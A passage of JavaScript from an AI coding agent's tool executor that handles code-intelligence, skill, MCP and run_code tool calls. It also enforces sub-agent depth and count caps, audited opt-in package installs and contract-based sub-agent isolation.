              for (const r of wsRoots) {
                try {
                  const rci = await _getSharedCodeIntel(r);
                  perRoot.push(await rci.workspaceSymbols(String(args.query)));
                } catch (err) {
                  perRoot.push({
                    available: false,
                    reason: err?.message || "workspace_symbols failed",
                  });
                }
              }
              res = mergeWorkspaceSymbolResults(perRoot, wsRoots);
            } else {
              res = await ci.workspaceSymbols(String(args.query));
            }
            break;
          }
          case "diagnostics":
            res = await ci.diagnostics(file);
            break;
          case "rename_preview":
            res = await ci.renamePreview(
              file,
              args.line,
              args.col,
              args.new_name,
            );
            break;
          default:
            return attachDescriptor({
              error:
                `Unknown code_intelligence action "${action}". Valid: definition, ` +
                `references, hover, document_symbols, workspace_symbols, ` +
                `diagnostics, rename_preview.`,
            });
        }
      } catch (err) {
        return attachDescriptor({
          error: `code_intelligence failed: ${err.message}`,
        });
      }
      // No language server installed for this file — tell the agent to fall back
      // rather than looping on an empty result.
      if (res && res.available === false) {
        return attachDescriptor({
          unavailable: true,
          reason: res.reason,
          hint: "No language server available — use search_files / read_file instead.",
        });
      }
      return attachDescriptor(res);
    }

    case "list_dir": {
      const dirPath = args.path ? path.resolve(cwd, args.path) : cwd;
      if (!fs.existsSync(dirPath)) {
        return attachDescriptor({ error: `Directory not found: ${dirPath}` });
      }
      // Clear error instead of the cryptic "ENOTDIR" readdirSync throws on a file.
      if (!fs.statSync(dirPath).isDirectory()) {
        return attachDescriptor({
          error: `Path is a file, not a directory: ${dirPath}. Use read_file to read it.`,
        });
      }
      const entries = fs.readdirSync(dirPath, { withFileTypes: true });
      return attachDescriptor(
        await _withSubtreeInstructions(
          {
            entries: entries.map((e) => ({
              name: e.name,
              type: e.isDirectory() ? "dir" : "file",
            })),
          },
          dirPath,
          cwd,
        ),
      );
    }

    case "run_skill": {
      const allSkills = await filterSkillsByCwd(
        skillLoader.getResolvedSkills().filter(skillAllowed),
        cwd,
      );
      if (allSkills.length === 0) {
        return attachDescriptor({
          error: _skillAllowlist
            ? "No skills are available to this sub-agent (restricted by its contract's skill allow-list)."
            : "No skills found. Make sure you're in the ChainlessChain project root or have skills installed.",
        });
      }
      const match = allSkills.find(
        (s) => s.id === args.skill_name || s.dirName === args.skill_name,
      );
      if (!match || !match.hasHandler) {
        return attachDescriptor({
          error: `Skill "${args.skill_name}" not found or has no handler. Use list_skills to see available skills.`,
        });
      }

      // Check if skill requests isolation (via SKILL.md frontmatter)
      const skillIsolation = match.isolation === true;
      if (skillIsolation) {
        // 用量归因: an isolated skill runs as a child loop whose real token
        // usage would otherwise be invisible — forward it into the parent
        // run's sink tagged origin:"skill" so `cc session usage --by skill`
        // can break it out. A nested frame passes through unchanged.
        const skillUsageSink = Array.isArray(subAgentUsageSink)
          ? subAgentUsageSink
          : null;
        let skillSubRef = null;
        // Run skill through isolated sub-agent context
        const subCtx = SubAgentContext.create({
          role: `skill-${args.skill_name}`,
          task: `Execute the "${args.skill_name}" skill with input: ${(args.input || "").substring(0, 200)}`,
          allowedTools: ["read_file", "search_files", "list_dir"],
          hookParentTraceId: hookTraceId || null,
          toolAdmission,
          cwd,
          onUsage: skillUsageSink
            ? (u) => {
                try {
                  skillUsageSink.push(
                    u && u.attribution
                      ? u
                      : {
                          provider: u?.provider ?? null,
                          model: u?.model ?? null,
                          usage: u?.usage || null,
                          attribution: {
                            origin: "skill",
                            skill: args.skill_name,
                            subagentId: skillSubRef?.id || null,
                            parentSessionId: sessionId || null,
                            depth: (subAgentDepth || 0) + 1,
                          },
                        },
                  );
                } catch (_e) {
                  // usage forwarding is best-effort
                }
              }
            : null,
        });
        skillSubRef = subCtx;
        try {
          const result = await subCtx.run(args.input);
          return attachDescriptor({
            success: true,
            isolated: true,
            skill: args.skill_name,
            summary: result.summary,
            toolsUsed: result.toolsUsed,
          });
        } catch (err) {
          return attachDescriptor({
            error: `Isolated skill execution failed: ${err.message}`,
          });
        }
      }

      // Skill-Embedded MCP: mount the skill's declared MCP servers for
      // the duration of handler.execute, then unmount in finally. The
      // handler may use them via taskContext.mcpClient. If mcpClient is
      // null (no MCP set up for this session), skip silently.
      let mountedMcpServers = [];
      const hasSkillMcps =
        Array.isArray(match.mcpServers) && match.mcpServers.length > 0;
      if (hasSkillMcps && mcpClient) {
        try {
          const mountResult = await mountSkillMcpServers(mcpClient, match, {
            onWarn: (msg) => {
              // Non-fatal — logged as warning, skipped servers captured
              // in mountResult.skipped.
              // eslint-disable-next-line no-console
              console.warn(msg);
            },
          });
          mountedMcpServers = mountResult.mounted;
          for (const s of mountedMcpServers) {
            _activeMcpServers.add(typeof s === "string" ? s : s.name);
          }
        } catch (err) {
          return attachDescriptor({
            error: `Skill MCP mount failed: ${err.message}`,
          });
        }
      }

      try {
        const handlerPath = path.join(match.skillDir, "handler.js");
        const imported = await import(
          `file://${handlerPath.replace(/\\/g, "/")}`
        );
        const handler = imported.default || imported;
        if (handler.init) await handler.init(match);
        const task = {
          params: { input: args.input },
          input: args.input,
          action: args.input,
        };
        const taskContext = {
          projectRoot: cwd,
          workspacePath: cwd,
          // Expose the MCP client + mounted servers so the skill handler
          // can call MCP tools directly without going through the agent
          // loop. Handlers that don't need MCP can ignore these.
          mcpClient: mcpClient || null,
          mountedMcpServers,
        };
        const result = await handler.execute(task, taskContext, match);
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({
          error: `Skill execution failed: ${err.message}`,
        });
      } finally {
        if (mountedMcpServers.length > 0 && mcpClient) {
          try {
            await unmountSkillMcpServers(mcpClient, mountedMcpServers);
          } catch (_err) {
            // Non-critical — mount/unmount errors don't fail the skill
          }
          for (const s of mountedMcpServers) {
            _activeMcpServers.delete(typeof s === "string" ? s : s.name);
          }
        }
      }
    }

    case "list_skills": {
      let skills = await filterSkillsByCwd(
        skillLoader.getResolvedSkills().filter(skillAllowed),
        cwd,
      );
      if (skills.length === 0) {
        return attachDescriptor({
          error: _skillAllowlist
            ? "No skills are available to this sub-agent (restricted by its contract's skill allow-list)."
            : "No skills found.",
        });
      }
      if (args.category) {
        skills = skills.filter(
          (s) => s.category.toLowerCase() === args.category.toLowerCase(),
        );
      }
      if (args.query) {
        const q = args.query.toLowerCase();
        skills = skills.filter(
          (s) =>
            s.id.includes(q) ||
            s.description.toLowerCase().includes(q) ||
            s.category.toLowerCase().includes(q),
        );
      }
      return attachDescriptor({
        count: skills.length,
        skills: skills.map((s) => ({
          id: s.id,
          category: s.category,
          source: s.source,
          hasHandler: s.hasHandler,
          description: (s.description || "").substring(0, 80),
        })),
      });
    }

    default:
      if (localToolExecutor?.kind === "mcp-resource") {
        if (!mcpClient) {
          return attachDescriptor({
            error: `MCP client is unavailable for tool: ${name}`,
          });
        }
        try {
          if (localToolExecutor.op === "list") {
            const resources =
              typeof mcpClient.listResources === "function"
                ? mcpClient.listResources(args?.server || undefined)
                : [];
            return attachDescriptor({ count: resources.length, resources });
          }
          // op === "read"
          const uri = args?.uri;
          if (!uri || typeof uri !== "string") {
            return attachDescriptor({
              error: "read_mcp_resource requires a string 'uri' argument.",
            });
          }
          let server = args?.server;
          if (!server && typeof mcpClient.listResources === "function") {
            const match = mcpClient
              .listResources()
              .find((r) => r && r.uri === uri);
            server = match?.server;
          }
          if (!server) {
            return attachDescriptor({
              error: `Could not resolve which MCP server owns resource "${uri}". Pass 'server' explicitly.`,
            });
          }
          const result = await mcpClient.readResource(server, uri);
          return attachDescriptor(
            result && typeof result === "object" ? result : { result },
          );
        } catch (err) {
          return attachDescriptor({
            error: `MCP resource access failed: ${err.message}`,
          });
        }
      }

      // Internal tool-search tool (MCP context scaling): resolves deferred
      // MCP tool schemas from the registry attached at setup time. Read-only,
      // local — same risk class as list_skills, so no approval gate.
      if (localToolExecutor?.kind === "tool-search") {
        return attachDescriptor(
          executeToolSearch(localToolExecutor.registry, args || {}),
        );
      }

      if (localToolExecutor?.kind === "mcp") {
        if (!mcpClient || typeof mcpClient.callTool !== "function") {
          return attachDescriptor({
            error: `MCP client is unavailable for tool: ${name}`,
          });
        }

        // Deferred-schema gate: a direct call to a tool whose schema was never
        // loaded returns a self-healing error embedding the schema (and marks
        // it loaded), instead of forwarding likely-malformed arguments to the
        // server. No-op unless tool search deferred this tool.
        const deferredGate = gateDeferredMcpCall(name, localToolExecutor);
        if (deferredGate) {
          return attachDescriptor(deferredGate);
        }

        try {
          const result = await mcpClient.callTool(
            localToolExecutor.serverName,
            localToolExecutor.toolName,
            args || {},
          );
          if (result && typeof result === "object") {
            return attachDescriptor(result);
          }
          return attachDescriptor({ result });
        } catch (err) {
          return attachDescriptor({
            error: `MCP tool execution failed: ${err.message}`,
          });
        }
      }

      if (
        hostToolDefinition &&
        interaction &&
        typeof interaction.requestHostTool === "function"
      ) {
        const hostedResult = await interaction.requestHostTool(name, args);
        if (hostedResult?.success === false) {
          return attachDescriptor({
            error:
              hostedResult.error || `Hosted tool execution failed: ${name}`,
            policy: hostToolPolicy || null,
          });
        }

        if (hostedResult?.result && typeof hostedResult.result === "object") {
          return hostedResult.result;
        }

        return attachDescriptor({
          result:
            hostedResult &&
            Object.prototype.hasOwnProperty.call(hostedResult, "result")
              ? hostedResult.result
              : hostedResult,
        });
      }

      return attachDescriptor({ error: `Unknown tool: ${name}` });
  }
}

// ─── run_code implementation ──────────────────────────────────────────────

/**
 * Classify an error from code execution into a structured type with hints.
 * @param {string} stderr - stderr output
 * @param {string} message - error message
 * @param {number|null} exitCode - process exit code
 * @param {string} lang - language (python, node, bash)
 * @returns {{ errorType: string, hint: string }}
 */
export function classifyError(stderr, message, exitCode, lang) {
  const text = stderr || message || "";

  // Import / module errors
  if (/ModuleNotFoundError|ImportError|No module named/i.test(text)) {
    const modMatch = text.match(/No module named ['"]([^'"]+)['"]/);
    return {
      errorType: "import_error",
      hint: modMatch
        ? `Missing Python module "${modMatch[1]}". Will attempt auto-install.`
        : "Missing module. Check your imports.",
    };
  }

  // Syntax errors
  if (/SyntaxError|IndentationError|TabError/i.test(text)) {
    const lineMatch = text.match(/line (\d+)/i);
    return {
      errorType: "syntax_error",
      hint: lineMatch
        ? `Syntax error on line ${lineMatch[1]}. Check for typos, missing colons, or indentation.`
        : "Syntax error in code. Check for typos or missing brackets.",
    };
  }

  // Timeout
  if (/ETIMEDOUT|timed?\s*out/i.test(text) || exitCode === null) {
    return {
      errorType: "timeout",
      hint: "Script timed out. Consider increasing timeout or optimizing the code.",
    };
  }

  // Permission errors
  if (/EACCES|Permission denied|PermissionError/i.test(text)) {
    return {
      errorType: "permission_error",
      hint: "Permission denied. Try a different directory or run with appropriate permissions.",
    };
  }

  // Generic runtime error
  const lineMatch = text.match(/(?:line |:)(\d+)/);
  return {
    errorType: "runtime_error",
    hint: lineMatch
      ? `Runtime error near line ${lineMatch[1]}. Check the traceback above.`
      : "Runtime error. Check stderr for details.",
  };
}

/**
 * Validate a package name for pip install (reject shell metacharacters).
 * @param {string} name
 * @returns {boolean}
 */
export function isValidPackageName(name) {
  return /^[a-zA-Z0-9_][a-zA-Z0-9._-]*$/.test(name) && name.length <= 100;
}

/**
 * Execute code with auto pip-install, script persistence, and error classification.
 */
async function _executeRunCode(args, cwd) {
  const lang = args.language;
  const code = args.code;
  const timeoutSec = Math.min(Math.max(args.timeout || 60, 1), 300);
  // gap-analysis 2026-07-11 P0 "依赖安装与凭据": agent-generated scripts
  // default to the OS temp dir; only an explicit persist:true lands them in
  // the project (.chainlesschain/agent-scripts/).
  const persist = args.persist === true; // default false (temp dir)

  const extMap = { python: ".py", node: ".js", bash: ".sh" };
  const ext = extMap[lang];
  if (!ext) {
    return {
      error: `Unsupported language: ${lang}. Use python, node, or bash.`,
    };
  }

  // Determine script path
  let scriptPath;
  if (persist) {
    const scriptsDir = path.join(cwd, ".chainlesschain", "agent-scripts");
    if (!fs.existsSync(scriptsDir)) {
      fs.mkdirSync(scriptsDir, { recursive: true });
    }
    const timestamp = new Date()
      .toISOString()
      .replace(/[T:]/g, "-")
      .replace(/\.\d+Z$/, "");
    scriptPath = path.join(scriptsDir, `${timestamp}-${lang}${ext}`);
  } else {
    scriptPath = path.join(os.tmpdir(), `cc-agent-${Date.now()}${ext}`);
  }

  try {
    fs.writeFileSync(scriptPath, code, "utf8");

    // Determine interpreter
    let interpreter;
    if (lang === "python") {
      const py = getCachedPython();
      interpreter = py.found ? py.command : "python";
    } else if (lang === "node") {
      interpreter = "node";
    } else {
      interpreter = "bash";
    }

    const start = Date.now();
    let output;
    try {
      output = execSync(`${interpreter} "${scriptPath}"`, {
        cwd,
        encoding: "utf8",
        timeout: timeoutSec * 1000,
        maxBuffer: 5 * 1024 * 1024,
      });
    } catch (err) {
      const stderr = (err.stderr || "").toString();
      const message = err.message || "";
      const classified = classifyError(stderr, message, err.status, lang);

      // Auto-install missing Python packages
      if (lang === "python" && classified.errorType === "import_error") {
        const modMatch = stderr.match(/No module named ['"]([^'"]+)['"]/);
        if (modMatch) {
          // Use top-level package name (e.g. "foo.bar" → "foo")
          const packageName = modMatch[1].split(".")[0];

          if (!isValidPackageName(packageName)) {
            return {
              error: `Invalid package name: "${packageName}"`,
              ...classified,
              language: lang,
              scriptPath: persist ? scriptPath : undefined,
            };
          }

          // Auto-install is OPT-IN (settings runCode.autoInstall / env
          // CC_RUN_CODE_AUTO_INSTALL=1) with an optional package allowlist;
          // every attempt — including refused ones — is audited.
          const {
            resolveAutoInstallPolicy,
            isPackageAllowed,
            autoInstallDisabledHint,
            recordInstallAudit,
          } = await import("../lib/dependency-install-policy.js");
          const installPolicy = resolveAutoInstallPolicy({ cwd });
          if (!installPolicy.enabled) {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "disabled",
            });
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: autoInstallDisabledHint(packageName),
              scriptPath: persist ? scriptPath : undefined,
            };
          }
          if (!isPackageAllowed(packageName, installPolicy.allowlist)) {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "blocked",
            });
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: `Package "${packageName}" is not in runCode.installAllowlist — install it manually or add it to the allowlist.`,
              scriptPath: persist ? scriptPath : undefined,
            };
          }

          // Unified install-command audit (P0 sandbox slice): the same opt-in
          // trail (CC_INSTALL_AUDIT / settings installPolicy) that records
          // run_shell installs also records run_code auto-installs — one audit
          // file covers every "fetch and run third-party code" entry point.
          // Best-effort; default (policy off) writes nothing.
          let auditUnifiedInstall = () => {};
          try {
            const icp = await import("../lib/install-command-policy.js");
            const unified = icp.resolveInstallPolicy({});
            if (unified.audit) {
              const installCommand = `${interpreter} -m pip install ${packageName}`;
              const cls = icp.classifyInstallCommand(installCommand);
              auditUnifiedInstall = (outcome, detail) =>
                icp.recordInstallCommandAudit({
                  source: "run_code_auto_install",
                  command: installCommand,
                  outcome,
                  ...(detail ? { detail } : {}),
                  installs: cls.installs,
                  global: icp.hasGlobalInstall(cls),
                });
            }
          } catch {
            /* unified audit must never affect the install itself */
          }

          // Attempt pip install
          try {
            execSync(`${interpreter} -m pip install ${packageName}`, {
              encoding: "utf-8",
              timeout: 120000,
              maxBuffer: 2 * 1024 * 1024,
              stdio: ["pipe", "pipe", "pipe"],
            });
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "installed",
            });
            auditUnifiedInstall("installed");

            // Retry execution
            const retryStart = Date.now();
            const retryOutput = execSync(`${interpreter} "${scriptPath}"`, {
              cwd,
              encoding: "utf8",
              timeout: timeoutSec * 1000,
              maxBuffer: 5 * 1024 * 1024,
            });
            const retryDuration = Date.now() - retryStart;

            return {
              success: true,
              output: retryOutput.substring(0, 50000),
              language: lang,
              duration: `${retryDuration}ms`,
              autoInstalled: [packageName],
              scriptPath: persist ? scriptPath : undefined,
            };
          } catch (pipErr) {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "failed",
              detail: (pipErr.stderr || pipErr.message || "").substring(0, 200),
            });
            auditUnifiedInstall(
              "failed",
              (pipErr.stderr || pipErr.message || "").substring(0, 200),
            );
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: `Failed to auto-install "${packageName}". ${(pipErr.stderr || pipErr.message || "").substring(0, 500)}`,
              scriptPath: persist ? scriptPath : undefined,
            };
          }
        }
      }

      return {
        error: (stderr || message).substring(0, 5000),
        stderr: stderr.substring(0, 5000),
        exitCode: err.status,
        language: lang,
        ...classified,
        scriptPath: persist ? scriptPath : undefined,
      };
    }

    const duration = Date.now() - start;
    return {
      success: true,
      output: output.substring(0, 50000),
      language: lang,
      duration: `${duration}ms`,
      scriptPath: persist ? scriptPath : undefined,
    };
  } finally {
    // Only clean up if not persisting
    if (!persist) {
      try {
        fs.unlinkSync(scriptPath);
      } catch {
        // Cleanup best-effort
      }
    }
  }
}

// ─── spawn_sub_agent implementation ──────────────────────────────────────

/**
 * Max sub-agent nesting depth (Claude-Code 2.1.172 parity: sub-agents may
 * spawn their own sub-agents, capped at 5 levels so a runaway model cannot
 * recurse forever). Main loop = depth 0, its children = 1, …
 */
export const MAX_SUB_AGENT_DEPTH = 5;

/**
 * Max TOTAL sub-agents a single run may spawn across the whole tree. The depth
 * cap bounds how DEEP nesting goes (5), but not how WIDE: every level could fan
 * out many children, each with its own fresh iteration budget, so depth-cap
 * alone leaves total work ~budget^depth in a runaway/adversarial case. A shared
 * counter (threaded by reference through the tool context, like subAgentDepth)
 * gives a hard ceiling on the whole tree. Generous enough for legitimate
 * fan-out delegation; a model that blows past it is looping. Override per run
 * with `options.subAgentBudget`.
 */
export const MAX_SUB_AGENTS_PER_RUN = 32;

/**
 * Per-tool-result character cap fed back to the model. One giant tool output (a
 * huge file, a verbose command, an MCP blob) must not blow the context window —
 * but the model is TOLD when output is cut, instead of the old silent
 * `substring(0, 5000)` that sliced mid-content with no marker and undercut even
 * read_file's own 50k self-limit. Tools that self-limit (read_file, notebook
 * render) stay below this; it is the final safety net for the ones that don't
 * (run_shell, search_files, run_code, MCP). Override with CC_MAX_TOOL_RESULT_CHARS.
 */
export const MAX_TOOL_RESULT_CHARS = (() => {
  const n = Number(process.env.CC_MAX_TOOL_RESULT_CHARS);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : 50000;
})();

/**
 * Cap a serialized tool result to `max` chars, appending a visible truncation
 * marker (with the original length + how to get the rest) when it overflows —
 * so the model never silently receives a mid-content slice. Pure; exported for
 * tests.
 */
export function capToolResultString(serialized, max = MAX_TOOL_RESULT_CHARS) {
  const s = String(serialized ?? "");
  if (s.length <= max) return s;
  return (
    s.slice(0, max) +
    `\n…[tool output truncated: showing the first ${max} of ${s.length} chars` +
    ` — narrow the request (read a line range, grep, or paginate) to see the rest]`
  );
}

/**
 * Serialize a tool result for the transcript without ever throwing. A plain
 * `JSON.stringify` throws on a circular reference, a BigInt, or a value whose
 * `toJSON` throws — and that call sits OUTSIDE executeTool's try/catch, so one
 * odd tool result would crash the whole agent turn. The happy path is identical
 * to `JSON.stringify` (returns its value verbatim, including `undefined`, which
 * `capToolResultString` already normalizes); only a throw falls back to a
 * circular- and BigInt-safe pass, then a last-resort string form.
 */
export function safeStringifyToolResult(value) {
  try {
    return JSON.stringify(value);
  } catch {
    try {
      const seen = new WeakSet();
      return JSON.stringify(value, (_k, v) => {
        if (typeof v === "bigint") return v.toString();
        if (v && typeof v === "object") {
          if (seen.has(v)) return "[Circular]";
          seen.add(v);
        }
        return v;
      });
    } catch {
      try {
        return String(value);
      } catch {
        return "[unserializable tool result]";
      }
    }
  }
}

/**
 * Execute a spawn_sub_agent tool call.
 * Creates an isolated SubAgentContext, runs it, and returns only the summary.
 *
 * @param {object} args - { role, task, context?, tools? }
 * @param {object} ctx - { skillLoader, cwd, parentMessages, interaction, sessionId }
 * @returns {Promise<object>}
 */
/**
 * Remove and return every SETTLED background sub-agent entry from the run's
 * map. Called by agentLoop before each LLM call (deliver fresh results) and
 * after the end-of-run wait (deliver stragglers).
 */
function _takeSettledBackgroundSubAgents(map) {
  const done = [];
  for (const [id, entry] of map) {
    if (entry.settled) {
      done.push(entry);
      map.delete(id);
    }
  }
  return done;
}

/**
 * Render a settled background sub-agent's outcome as the user-role message
 * injected into the parent conversation (the only channel that reaches the
 * model between turns — there is no open tool_call to attach a result to).
 */
function _backgroundSubAgentResultText(entry) {
  const o = entry.outcome || {};
  const status = o.error ? "FAILED" : "completed";
  const summary =
    (o.result && o.result.summary) || o.error || "(no output from sub-agent)";
  const tools =
    o.result && Array.isArray(o.result.toolsUsed) && o.result.toolsUsed.length
      ? `\nTools used: ${o.result.toolsUsed.join(", ")}`
      : "";
  const feedback = entry.hookFeedback
    ? `\nHook feedback: ${entry.hookFeedback}`
    : "";
  return (
    `[Background sub-agent "${entry.role}" (${entry.id}) ${status}]\n` +
    `Task: ${entry.task}\n` +
    `Result:\n${summary}${tools}${feedback}`
  );
}

/**
 * Drain the run's attributed child-loop usage sink (spawn_sub_agent /
 * isolated run_skill — see toolContext.subAgentUsageSink), re-yielding each
 * record as a regular `token-usage` event that carries its `attribution`
 * frame. Consumers that ignore `attribution` see ordinary usage events;
 * attribution-aware consumers (REPL persistence, headless runner) can split
 * child spend from the main conversation's.
 */
function* _drainSubAgentUsage(sink) {
  while (Array.isArray(sink) && sink.length > 0) {
    const u = sink.shift();
    yield {
      type: "token-usage",
      provider: u?.provider ?? null,
      model: u?.model ?? null,
      usage: u?.usage || {},
      attribution: u?.attribution || null,
    };
  }
}

async function _executeSpawnSubAgent(args, ctx) {
  // Nesting cap: refuse before any context/registry work.
  const currentDepth = ctx.subAgentDepth || 0;
  if (currentDepth >= MAX_SUB_AGENT_DEPTH) {
    return {
      error: `spawn_sub_agent: max nesting depth (${MAX_SUB_AGENT_DEPTH}) reached — complete the task directly instead of delegating further.`,
    };
  }
  // Contract-aware recursion tightening: a parent's EFFECTIVE contract can only
  // LOWER the absolute hard caps (fail-closed, tighten-only). Evaluated before
  // the breadth counter increments so spawnedCount is this-spawn-exclusive.
  if (ctx.subAgentContract) {
    try {
      const { enforceRecursionLimits } =
        await import("../lib/subagent-contract.js");
      const recur = enforceRecursionLimits({
        depth: currentDepth,
        spawnedCount: ctx.subAgentBudget?.spawned || 0,
        contract: ctx.subAgentContract,
        hardDepthCap: MAX_SUB_AGENT_DEPTH,
        hardChildrenCap: ctx.subAgentBudget?.max ?? MAX_SUB_AGENTS_PER_RUN,
      });
      if (!recur.ok) return { error: `spawn_sub_agent: ${recur.reason}` };
    } catch {
      /* contract module unavailable — hard caps above still apply */
    }
  }
  // Breadth cap: a shared counter (one object for the whole tree) bounds the
  // TOTAL sub-agents a run may spawn, so a wide fan-out can't blow up even
  // within the depth limit. Refuse + count BEFORE any work so the increment
  // can't be skipped by a later error.
  const subAgentBudget = ctx.subAgentBudget || null;
  if (subAgentBudget) {
    const max = Number.isFinite(subAgentBudget.max)
      ? subAgentBudget.max
      : MAX_SUB_AGENTS_PER_RUN;
    if ((subAgentBudget.spawned || 0) >= max) {
      return {
        error: `spawn_sub_agent: max sub-agents per run (${max}) reached — complete remaining work directly instead of delegating further.`,
      };
    }
    subAgentBudget.spawned = (subAgentBudget.spawned || 0) + 1;
  }
  let {
    role,
    task,
    context: inheritedContext,
    tools: explicitTools,
    profile: profileName,
  } = args;
  // Extended sub-agent contract (gap 2026-07-11 P1): per-spawn deny-list,
  // iteration cap and worktree isolation — spawn args win over the agent
  // file's frontmatter defaults.
  let disallowedTools = Array.isArray(args.disallowedTools)
    ? args.disallowedTools.filter(Boolean)
    : null;
  let subMaxTurns =
    Number.isFinite(Number(args.maxTurns)) && Number(args.maxTurns) > 0
      ? Math.floor(Number(args.maxTurns))
      : null;
  let subIsolation = args.isolation === "worktree" ? "worktree" : null;

  // Named subagent delegation (cc agents / .chainlesschain|.claude/agents/*.md):
  // load the agent's persona (its body = system prompt) + tool allow-list.
  // Explicit role/tools still win over the agent file's values.
  let mdProfile = null;
  let mdModel = null;
  let mdContract = null; // agent-file's normalized subagent contract (definition)
  let mdSparsePaths = null; // agent-file worktree sparse-checkout paths
  let mdSymlinkDirectories = null; // agent-file worktree dep-dir symlinks
  if (args.agent) {
    try {
      const { getAgent } = await import("../lib/agents.js");
      const md = getAgent(args.agent, ctx.cwd);
      if (!md) {
        return {
          error: `Unknown subagent "${args.agent}". List them with: cc agents list`,
        };
      }
      role = role || md.name;
      if (!explicitTools && Array.isArray(md.tools)) explicitTools = md.tools;
      if (!disallowedTools && Array.isArray(md.disallowedTools)) {
        disallowedTools = md.disallowedTools;
      }
      if (!subMaxTurns && md.maxTurns) subMaxTurns = md.maxTurns;
      if (!subIsolation && md.isolation === "worktree") {
        subIsolation = "worktree";
      }
      if (md.sparsePaths != null) mdSparsePaths = md.sparsePaths;
      if (md.symlinkDirectories != null) {
        mdSymlinkDirectories = md.symlinkDirectories;
      }
      if (md.model) mdModel = md.model;
      if (md.contract) mdContract = md.contract;
      if (md.systemPrompt) {
        mdProfile = { name: md.name, systemPrompt: md.systemPrompt };
      }
    } catch (err) {
      return {
        error: `Failed to load subagent "${args.agent}": ${err.message}`,
      };
    }
  }

  if (!task || (!role && !args.agent)) {
    return {
      error: "spawn_sub_agent requires 'task' and either 'role' or 'agent'",
    };
  }

  // Resolve the child's EFFECTIVE subagent contract: spawnArgs > agent-file
  // definition (mdContract) > parent ceiling (ctx.subAgentContract). The safe,
  // tighten-only fields are consumed below (isolation fail-closed, budget,
  // effort, context inheritance); this child's contract becomes the ceiling for
  // ITS own nested spawns (threaded via SubAgentContext.subAgentContract).
  let effectiveContract = null;
  let explicitContext = null;
  let skillAllowlist = null;
  // MCP-server + hook allow-lists for child INHERITANCE. Default `[]` = inherit
  // NONE, which equals today's behavior (a spawned child gets zero MCP tools /
  // zero Pre-PostToolUse hooks). `context: fork` resolves these to `null` (all);
  // an explicit list subsets them. See filterInherited* below.
  let mcpAllow = [];
  let hookAllow = [];
  // Was the child's permission mode EXPLICITLY driven — a `permissionMode` in the
  // spawn args / agent file, OR a NON-"default" parent ceiling from the run
  // (`--permission-mode manual|acceptEdits|…`)? Only then do we attach an
  // ApprovalGate to the child (below), so a plain default spawn stays ungated
  // = byte-identical.
  let permModeDriven = false;
  try {
    const { resolveSubagentContract, normalizeSubagentContract } =
      await import("../lib/subagent-contract.js");
    const spawnContract = normalizeSubagentContract(args);
    explicitContext = spawnContract.context ?? mdContract?.context ?? null;
    effectiveContract = resolveSubagentContract({
      parent: ctx.subAgentContract || {},
      definition: mdContract,
      spawnArgs: spawnContract,
    });
    permModeDriven =
      spawnContract.permissionMode != null ||
      mdContract?.permissionMode != null ||
      (ctx.subAgentContract?.permissionMode != null &&
        ctx.subAgentContract.permissionMode !== "default");
    // Skill capability INTERSECT: restrict the child's skills ONLY when it was
    // explicitly driven — an explicit `skills` list (spawn args or agent file)
    // OR an explicit `context` mode. A fully-defaulted spawn stays unrestricted
    // (null) so the silent-`fresh`→[] default can never strip ALL skills from a
    // plain sub-agent. `effectiveContract.skills` already encodes the intersect
    // against the parent ceiling (tighten-only across depth).
    const skillsDriven =
      spawnContract.skills != null ||
      mdContract?.skills != null ||
      explicitContext != null;
    skillAllowlist = skillsDriven ? (effectiveContract.skills ?? null) : null;
    // MCP/hooks work the OTHER way from skills: their pre-inheritance default is
    // "none", so the silent-`fresh`→[] resolution IS the safe current behavior —
    // no explicit-driven guard needed. A list (or `null` on fork) opts the child
    // into inheriting the corresponding parent capabilities.
    mcpAllow = effectiveContract.mcpServers ?? null;
    hookAllow = effectiveContract.hooks ?? null;
  } catch {
    effectiveContract = null; // contract resolution is best-effort
    skillAllowlist = null;
    mcpAllow = []; // inherit no MCP / hooks when resolution fails
    hookAllow = [];
    permModeDriven = false; // no gate when resolution fails
  }

  // Filter the parent loop's live MCP plumbing + settings hooks down to what the
  // child may inherit. Default `[]` → null → the spawn passes nothing, so a plain
  // sub-agent is byte-identical to before.
  let inheritedMcp = null;
  let inheritedHooks = null;
  try {
    const { filterInheritedMcp, filterInheritedHooks } =
      await import("../lib/subagent-inheritance.js");
    inheritedMcp = filterInheritedMcp(
      {
        extraToolDefinitions: ctx.extraToolDefinitions,
        externalToolDescriptors: ctx.externalToolDescriptors,
        externalToolExecutors: ctx.externalToolExecutors,
        mcpClient: ctx.mcpClient,
      },
      mcpAllow,
    );
    inheritedHooks = filterInheritedHooks(ctx.settingsHooks || null, hookAllow);
  } catch {
    inheritedMcp = null; // inheritance is best-effort; never break the spawn
    inheritedHooks = null;
  }

  // Memory INHERITANCE (contract `memory` boolean, tighten-only across depth):
  // grant the child the parent's hierarchical-memory DB ONLY when the resolved
  // contract says memory:true (explicit, or context:fork from a memory-bearing
  // parent). Default (silent-`fresh`→memory:false) → no db + memoryEnabled:false
  // → no recall = today's behavior. `effectiveContract.memory` already encodes
  // the intersect (a parent that denied memory can never re-grant downstream).
  const memoryGranted = effectiveContract?.memory === true;
  const inheritedMemory =
    memoryGranted && ctx.memoryDb
      ? { db: ctx.memoryDb, permanentMemory: ctx.permanentMemory || null }
      : null;

  // Worktree isolation must FAIL CLOSED: if requested but the cwd is not a git
  // repo, refuse the spawn instead of silently running in the parent checkout.
  if (subIsolation === "worktree") {
    try {
      const { resolveIsolationFailClosed } =
        await import("../lib/subagent-contract.js");
      const { isGitRepo } = await import("../lib/git-integration.js");
      const iso = resolveIsolationFailClosed({
        requested: "worktree",
        available: isGitRepo(ctx.cwd),
      });
      if (!iso.ok) return { error: `spawn_sub_agent: ${iso.reason}` };
    } catch {
